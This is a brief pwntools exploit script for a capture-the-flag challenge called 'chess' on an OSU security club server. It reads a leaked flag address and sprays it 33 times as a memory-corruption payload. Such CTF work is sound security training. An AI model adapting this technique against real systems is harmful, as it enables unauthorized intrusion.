from pwn import *

#p = process("./chess")
p = remote("ctf-league.osusec.org", 31315)
p.recvuntil("flag loaded at ")
addr = int(p.recvline()[:-1], 16)

print(hex(addr))
p.sendline("")
p.sendline(p64(addr) * 33)
p.sendline("exit")

p.interactive()
